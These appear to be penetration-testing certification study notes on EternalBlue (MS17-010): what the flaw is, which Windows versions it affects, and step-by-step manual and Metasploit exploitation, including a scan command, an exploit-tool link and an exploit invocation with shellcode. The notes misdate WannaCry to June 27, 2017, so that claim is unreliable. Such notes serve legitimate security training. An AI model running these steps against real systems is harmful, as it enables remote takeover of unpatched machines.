#eJPT #INE #EternalBlue


# What is EternalBlue ?

*EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities* and exploits that allow attackers to **remotely execute arbitrary code** and gain access to a Windows system and consequently the network that the target system is a part of.

+ The EternalBlue exploit was **developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability** and was leaked to the public by a hacker group called the *Shadow Brokers* in 2017.

+ The EternalBlue exploit takes advantage of **a vulnerability in the Windows SMBv1 protocol** that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.

- The EternalBlue exploit was used in the **WannaCry ransomware attack on June 27, 2017** to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.

# What is Affected ?

+ This vulnerability affects *multiple versions of Windows*:
○ Windows Vista
○ Windows 7
○ Windows Server 2008
○ Windows 8.1
○ Windows Server 2012
○ Windows 10
○ Windows Server 2016

# Patch ?

Microsoft released a *patch for the vulnerability in March, 2017,* however, many users and companies have still not yet patched their systems.

+ The EternalBlue exploit has a **MSF auxiliary module** that can be used to *check if a target system if vulnerable* to the exploit and also has an **exploit module** that can be *used to exploit the vulnerability* on unpatched systems.

# How to Exploit (Manual)

1. Check running services, and run vulnerability detection script
```bash
sudo nmap -v -A -p- --script=smb-vuln-ms17-010 TARGET_IP
```

2. Download, install exploit tool : https://github.com/3ndG4me/AutoBlue-MS17-010

3. Setup tool, set ports, set IP

4. Startup listener

5. PWN
```bash
python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin>
```

# How to Exploit (MSF)

1. Check running services, and run vulnerability detection script
```bash
sudo nmap -v -A -p- --script=smb-vuln-ms17-010 TARGET_IP
```

2. Launch Metasploit console

3. Use `exploit/windows/smb/ms_17_010_eternalblue`

4. Set up required options

5. PWN